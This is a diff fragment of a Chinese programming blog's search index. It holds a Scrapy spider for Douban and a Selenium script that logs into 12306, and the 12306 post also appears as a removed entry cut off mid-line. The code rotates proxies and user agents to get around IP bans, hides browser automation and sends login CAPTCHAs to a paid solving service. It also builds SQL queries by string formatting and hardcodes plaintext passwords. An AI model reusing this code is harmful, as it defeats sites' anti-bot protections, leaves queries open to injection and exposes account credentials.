self.num += <span class="number">25</span></span><br><span class="line">                <span class="keyword">yield</span> scrapy.Request(new_url, callback=self.parse)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="piplines-py"><a class="header-anchor" href="#piplines-py">¶</a><a href="http://piplines.py">piplines.py</a></h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanproPipeline</span>:</span></span><br><span class="line">    conn=<span class="literal">None</span></span><br><span class="line">    cursor=<span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self,spider</span>):</span></span><br><span class="line">        self.conn = pymysql.Connect(host=<span class="string">&quot;localhost&quot;</span>, user=<span class="string">&quot;root&quot;</span>, port=<span class="number">3306</span>,password=<span class="string">&quot;ly0123456&quot;</span>,db=<span class="string">&quot;douban&quot;</span>,charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.cursor = self.conn.cursor()</span><br><span class="line">        print(<span class="string">&quot;连接数据库成功&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        <span class="comment"># name = item.get(&quot;name&quot;, &quot;N/A&quot;)</span></span><br><span class="line">        <span class="comment"># sql = &quot;insert into mode(name) VALUES (%s)&quot;</span></span><br><span class="line">        <span class="comment"># self.cursor.execute(sql, name)</span></span><br><span class="line">        self.cursor.execute(<span class="string">&#x27;insert into mode (id,name,detail) values(&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;)&#x27;</span> %(item[<span class="string">&quot;id&quot;</span>],item[<span class="string">&quot;name&quot;</span>],item[<span class="string">&quot;detail&quot;</span>]))</span><br><span class="line">        <span class="comment"># self.cursor.execute(&#x27;insert into mode (name,id) values(&quot;%s&quot;,&quot;%s&quot;)&#x27; %(item[&quot;name&quot;],item[&quot;id&quot;]))</span></span><br><span class="line">        self.conn.commit()</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self,spider</span>):</span></span><br><span class="line">        self.cursor.close()</span><br><span class="line">        self.conn.close()</span><br></pre></td></tr></table></figure>
+<h3 id="settings-py"><a class="header-anchor" href="#settings-py">¶</a><a href="http://settings.py">settings.py</a></h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启下载中间件</span></span><br><span class="line">DOWNLOADER_MIDDLEWARES = &#123;</span><br><span class="line">   <span class="string">&#x27;doubanpro.middlewares.DoubanproDownloaderMiddleware&#x27;</span>: <span class="number">543</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 开启管道</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">&#x27;doubanpro.pipelines.DoubanproPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为我在爬取的过程中出现了 ip被封的情况 所以顺便学了一下挂代理池和UA伪装</p>
+<h3 id="middlewares-py"><a class="header-anchor" href="#middlewares-py">¶</a><a href="http://middlewares.py">middlewares.py</a></h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanproDownloaderMiddleware</span>:</span></span><br><span class="line">    user_agent_list = [</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 &quot;</span></span><br><span class="line">        <span class="string">&quot;(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    PROXY_http = [</span><br><span class="line">        <span class="string">&#x27;175.42.128.123:9999&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;222.189.190.100:9999&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">    PROXY_https = [</span><br><span class="line">        <span class="string">&#x27;115.151.235.163:9999&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;183.166.110.189:9999&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span>(<span class="params">self, request, spider</span>):</span></span><br><span class="line">        <span class="comment"># request.headers[&#x27;User-Agent&#x27;] = random.choice(self.user_agent_list)</span></span><br><span class="line">        <span class="comment"># 这里可以直接指定使用的代理 不需要再 出现异常后再使用代理ip</span></span><br><span class="line">        request.meta[<span class="string">&#x27;proxy&#x27;</span>] =<span class="string">&#x27;http://127.0.0.1:10809&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_response</span>(<span class="params">self, request, response, spider</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_exception</span>(<span class="params">self, request, exception, spider</span>):</span></span><br><span class="line">        <span class="comment"># 对拦截到请求的url进行判断（协议头到底是http还是https）</span></span><br><span class="line">        <span class="comment"># request.url返回值：http://www.xxx.com</span></span><br><span class="line">        h = request.url.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]  <span class="comment"># 请求的协议头</span></span><br><span class="line">        <span class="keyword">if</span> h == <span class="string">&#x27;https&#x27;</span>:</span><br><span class="line">            request.meta[<span class="string">&#x27;proxy&#x27;</span>] = <span class="string">&#x27;https://&#x27;</span> + random.choice(self.PROXY_https)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            request.meta[<span class="string">&#x27;proxy&#x27;</span>] = <span class="string">&#x27;http://&#x27;</span> + random.choice(self.PROXY_http)</span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="items-py"><a class="header-anchor" href="#items-py">¶</a><a href="http://items.py">items.py</a></h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanproItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    name = scrapy.Field()</span><br><span class="line">    <span class="built_in">id</span> = scrapy.Field()</span><br><span class="line">    detail = scrapy.Field()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>使用超级鹰及selenium模块模拟登陆12306</title>
+    <url>/2021/02/26/%E4%BD%BF%E7%94%A8%E8%B6%85%E7%BA%A7%E9%B9%B0%E5%8F%8Aselenium%E6%A8%A1%E5%9D%97%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%8612306/</url>
+    <content><![CDATA[<p>完整代码如下</p>
+<p>吐槽一下图片定位和定位点击我都用了很笨的方法  因为正规老是有偏移</p>
+<h2 id="超级鹰介绍"><a class="header-anchor" href="#超级鹰介绍">¶</a>超级鹰介绍</h2>
+<p>网址: <a href="https://www.chaojiying.com/user/">https://www.chaojiying.com/user/</a></p>
+<p>进去后注册一个普通用户</p>
+<p>在开发文档下载python3的代码</p>
+<p>在软件id创建一个id  然后充值一块钱</p>
+<p><img src="https://img-blog.csdnimg.cn/20210226134331670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="超级鹰使用介绍"><a class="header-anchor" href="#超级鹰使用介绍">¶</a>超级鹰使用介绍</h2>
+<p>代码拷贝下来后 可以用他的示例代码和图片进行测试 具体示例代码都有注释 自行查看</p>
+<h2 id="爬取12306完整代码"><a class="header-anchor" href="#爬取12306完整代码">¶</a>爬取12306完整代码</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ChromeOptions</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chaojiying_Client</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, username, password, soft_id</span>):</span></span><br><span class="line">        self.username = username</span><br><span class="line">        password = password.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.password = md5(password).hexdigest()</span><br><span class="line">        self.soft_id = soft_id</span><br><span class="line">        self.base_params = &#123;</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: self.username,</span><br><span class="line">            <span class="string">&#x27;pass2&#x27;</span>: self.password,</span><br><span class="line">            <span class="string">&#x27;softid&#x27;</span>: self.soft_id,</span><br><span class="line">        &#125;</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PostPic</span>(<span class="params">self, im, codetype</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        im: 图片字节</span></span><br><span class="line"><span class="string">        codetype: 题目类型 参考 http://www.chaojiying.com/price.html</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;codetype&#x27;</span>: codetype,</span><br><span class="line">        &#125;</span><br><span class="line">        params.update(self.base_params)</span><br><span class="line">        files = &#123;<span class="string">&#x27;userfile&#x27;</span>: (<span class="string">&#x27;ccc.jpg&#x27;</span>, im)&#125;</span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://upload.chaojiying.net/Upload/Processing.php&#x27;</span>, data=params, files=files,</span><br><span class="line">                          headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ReportError</span>(<span class="params">self, im_id</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        im_id:报错题目的图片ID</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: im_id,</span><br><span class="line">        &#125;</span><br><span class="line">        params.update(self.base_params)</span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://upload.chaojiying.net/Upload/ReportError.php&#x27;</span>, data=params, headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line">option = ChromeOptions()</span><br><span class="line">option.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">bro = webdriver.Chrome(options=option)</span><br><span class="line"><span class="comment"># 12306的登录网址</span></span><br><span class="line">bro.get(<span class="string">&#x27;https://kyfw.12306.cn/otn/resources/login.html&#x27;</span>)</span><br><span class="line"><span class="comment"># 窗口最大化</span></span><br><span class="line">bro.maximize_window()</span><br><span class="line"><span class="comment">#bro.execute_script(&quot;document.body.style.zoom=&#x27;1.25&#x27;&quot;)</span></span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;/html/body/div[2]/div[2]/ul/li[2]/a&#x27;</span>).click()</span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-userName&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;L1yee01&#x27;</span>)</span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-password&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;ly0123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bro.save_screenshot(<span class="string">&#x27;aa.png&#x27;</span>)</span><br><span class="line"><span class="comment">#确定验证码图片对应的左上角和右下角的坐标（裁剪的区域就确定）</span></span><br><span class="line">code_img_ele = bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-loginImg&quot;]&#x27;</span>)</span><br><span class="line">location = code_img_ele.location <span class="comment"># 验证码图片左上角的坐标 x,y</span></span><br><span class="line"><span class="comment"># print(&#x27;location:&#x27;,location) #左上角1258 454   右下角1655 689    #+242 +162 +239 +100</span></span><br><span class="line">size = code_img_ele.size <span class="comment">#验证码标签对应的长和宽</span></span><br><span class="line"><span class="comment"># print(&#x27;size:&#x27;,size)</span></span><br><span class="line"><span class="comment">#左上角和右下角坐标  -62</span></span><br><span class="line">rangle=(<span class="number">1254</span>, <span class="number">360</span>, <span class="number">1652</span>, <span class="number">605</span>)</span><br><span class="line"><span class="comment">#至此验证码图片区域就确定下来了</span></span><br><span class="line">i = Image.<span class="built_in">open</span>(<span class="string">&#x27;./aa.png&#x27;</span>)</span><br><span class="line">code_img_name = <span class="string">&#x27;./code.png&#x27;</span></span><br><span class="line"><span class="comment">#crop根据指定区域进行图片裁剪</span></span><br><span class="line">frame = i.crop(rangle)</span><br><span class="line">frame.save(code_img_name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    chaojiying = Chaojiying_Client(<span class="string">&#x27;L1yee01&#x27;</span>, <span class="string">&#x27;x2R4.9dayAA3pca&#x27;</span>, <span class="string">&#x27;913264&#x27;</span>)</span><br><span class="line">    im = <span class="built_in">open</span>(<span class="string">&#x27;code.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    result=chaojiying.PostPic(im, <span class="number">9004</span>)[<span class="string">&#x27;pic_str&#x27;</span>]</span><br><span class="line">    <span class="comment">#print (chaojiying.PostPic(im, 9004))</span></span><br><span class="line">    all_list = []</span><br><span class="line">    chaojiying.ReportError(<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;|&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        list_1 = result.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">        count_1 = <span class="built_in">len</span>(list_1)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count_1):</span><br><span class="line">            xy_list = []</span><br><span class="line">            x = <span class="built_in">int</span>(list_1[i].split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">            y = <span class="built_in">int</span>(list_1[i].split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            xy_list.append(x)</span><br><span class="line">            xy_list.append(y)</span><br><span class="line">            all_list.append(xy_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x = <span class="built_in">int</span>(result.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">        y = <span class="built_in">int</span>(result.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        xy_list = []</span><br><span class="line">        xy_list.append(x)</span><br><span class="line">        xy_list.append(y)</span><br><span class="line">        all_list.append(xy_list)</span><br><span class="line">    print(all_list)</span><br><span class="line"><span class="comment"># 移动光标进行点击验证码, 动作链移动光标</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> all_list:</span><br><span class="line">        x = a[<span class="number">0</span>]-<span class="number">6</span></span><br><span class="line">        y = a[<span class="number">1</span>]-<span class="number">8</span></span><br><span class="line">        <span class="comment">#先实例化对象</span></span><br><span class="line">        action = ActionChains(bro)</span><br><span class="line">        <span class="comment"># 先把坐标原点偏移到验证码的原点  # 实例化动作链并立即执行移动操作</span></span><br><span class="line">        action.move_to_element_with_offset(code_img_ele, x, y).click().perform()</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">    bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-login&quot;]&#x27;</span>).click()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
       </categories>
   </entry>
   <entry>
@@ -2788,27 +2809,6 @@ index.php</p>
       </categories>
   </entry>
   <entry>
-    <title>使用超级鹰及selenium模块模拟登陆12306</title>
-    <url>/2021/02/26/%E4%BD%BF%E7%94%A8%E8%B6%85%E7%BA%A7%E9%B9%B0%E5%8F%8Aselenium%E6%A8%A1%E5%9D%97%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%8612306/</url>
-    <content><![CDATA[<p>完整代码如下</p>
-<p>吐槽一下图片定位和定位点击我都用了很笨的方法  因为正规老是有偏移</p>
-<h2 id="超级鹰介绍"><a class="header-anchor" href="#超级鹰介绍">¶</a>超级鹰介绍</h2>
-<p>网址: <a href="https://www.chaojiying.com/user/">https://www.chaojiying.com/user/</a></p>
-<p>进去后注册一个普通用户</p>
-<p>在开发文档下载python3的代码</p>
-<p>在软件id创建一个id  然后充值一块钱</p>
-<p><img src="https://img-blog.csdnimg.cn/20210226134331670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="超级鹰使用介绍"><a class="header-anchor" href="#超级鹰使用介绍">¶</a>超级鹰使用介绍</h2>
-<p>代码拷贝下来后 可以用他的示例代码和图片进行测试 具体示例代码都有注释 自行查看</p>
-<h2 id="爬取12306完整代码"><a class="header-anchor" href="#爬取12306完整代码">¶</a>爬取12306完整代码</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ChromeOptions</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chaojiying_Client</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, username, password, soft_id</span>):</span></span><br><span class="line">        self.username = username</span><br><span class="line">        password = password.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.password = md5(password).hexdigest()</span><br><span class="line">        self.soft_id = soft_id</span><br><span class="line">        self.base_params = &#123;</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: self.username,</span><br><span class="line">            <span class="string">&#x27;pass2&#x27;</span>: self.password,</span><br><span class="line">            <span class="string">&#x27;softid&#x27;</span>: self.soft_id,</span><br><span class="line">        &#125;</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PostPic</span>(<span class="params">self, im, codetype</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        im: 图片字节</span></span><br><span class="line"><span class="string">        codetype: 题目类型 参考 http://www.chaojiying.com/price.html</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;codetype&#x27;</span>: codetype,</span><br><span class="line">        &#125;</span><br><span class="line">        params.update(self.base_params)</span><br><span class="line">        files = &#123;<span class="string">&#x27;userfile&#x27;</span>: (<span class="string">&#x27;ccc.jpg&#x27;</span>, im)&#125;</span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://upload.chaojiying.net/Upload/Processing.php&#x27;</span>, data=params, files=files,</span><br><span class="line">                          headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ReportError</span>(<span class="params">self, im_id</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        im_id:报错题目的图片ID</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: im_id,</span><br><span class="line">        &#125;</span><br><span class="line">        params.update(self.base_params)</span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://upload.chaojiying.net/Upload/ReportError.php&#x27;</span>, data=params, headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line">option = ChromeOptions()</span><br><span class="line">option.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">bro = webdriver.Chrome(options=option)</span><br><span class="line"><span class="comment"># 12306的登录网址</span></span><br><span class="line">bro.get(<span class="string">&#x27;https://kyfw.12306.cn/otn/resources/login.html&#x27;</span>)</span><br><span class="line"><span class="comment"># 窗口最大化</span></span><br><span class="line">bro.maximize_window()</span><br><span class="line"><span class="comment">#bro.execute_script(&quot;document.body.style.zoom=&#x27;1.25&#x27;&quot;)</span></span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;/html/body/div[2]/div[2]/ul/li[2]/a&#x27;</span>).click()</span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-userName&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;L1yee01&#x27;</span>)</span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-password&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;ly0123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bro.save_screenshot(<span class="string">&#x27;aa.png&#x27;</span>)</span><br><span class="line"><span class="comment">#确定验证码图片对应的左上角和右下角的坐标（裁剪的区域就确定）</span></span><br><span class="line">code_img_ele = bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-loginImg&quot;]&#x27;</span>)</span><br><span class="line">location = code_img_ele.location <span class="comment"># 验证码图片左上角的坐标 x,y</span></span><br><span class="line"><span class="comment"># print(&#x27;location:&#x27;,location) #左上角1258 454   右下角1655 689    #+242 +162 +239 +100</span></span><br><span class="line">size = code_img_ele.size <span class="comment">#验证码标签对应的长和宽</span></span><br><span class="line"><span class="comment"># print(&#x27;size:&#x27;,size)</span></span><br><span class="line"><span class="comment">#左上角和右下角坐标  -62</span></span><br><span class="line">rangle=(<span class="number">1254</span>, <span class="number">360</span>, <span class="number">1652</span>, <span class="number">605</span>)</span><br><span class="line"><span class="comment">#至此验证码图片区域就确定下来了</span></span><br><span class="line">i = Image.<span class="built_in">open</span>(<span class="string">&#x27;./aa.png&#x27;</span>)</span><br><span class="line">code_img_name = <span class="string">&#x27;./code.png&#x27;</span></span><br><span class="line"><span class="comment">#crop根据指定区域进行图片裁剪</span></span><br><span class="line">frame = i.crop(rangle)</span><br><span class="line">frame.save(code_img_name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    chaojiying = Chaojiying_Client(<span class="string">&#x27;L1yee01&#x27;</span>, <span class="string">&#x27;x2R4.9dayAA3pca&#x27;</span>, <span class="string">&#x27;913264&#x27;</span>)</span><br><span class="line">    im = <span class="built_in">open</span>(<span class="string">&#x27;code.png&#x27;</span>, <span 